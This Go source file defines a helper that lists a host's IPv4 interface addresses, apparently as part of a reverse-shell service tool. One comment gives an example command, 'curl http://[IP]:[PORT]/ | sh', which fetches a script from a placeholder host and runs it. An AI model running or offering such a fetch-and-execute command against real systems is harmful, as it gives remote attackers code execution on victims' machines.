package network

import "net"

func GatherInterfacesList(host string) []string {
	// Gather interface info
	var interfaces []string
	// Add help information of RaaS
	// eg: curl http://[IP]:[PORT]/ | sh
	if net.ParseIP(host).IsUnspecified() {
		// tcpServer.Host is unspecified
		// eg: "0.0.0.0", "[::]"
		ifaces, _ := net.Interfaces()
		for _, i := range ifaces {
			addrs, _ := i.Addrs()
			for _, addr := range addrs {
				switch v := addr.(type) {
				case *net.IPNet:
					// ipv4
					if addr.(*net.IPNet).IP.To4() != nil {
						interfaces = append(interfaces, v.IP.String())
						break
					}
				}
			}
		}
	} else {
		interfaces = append(interfaces, host)
	}
	return interfaces
}
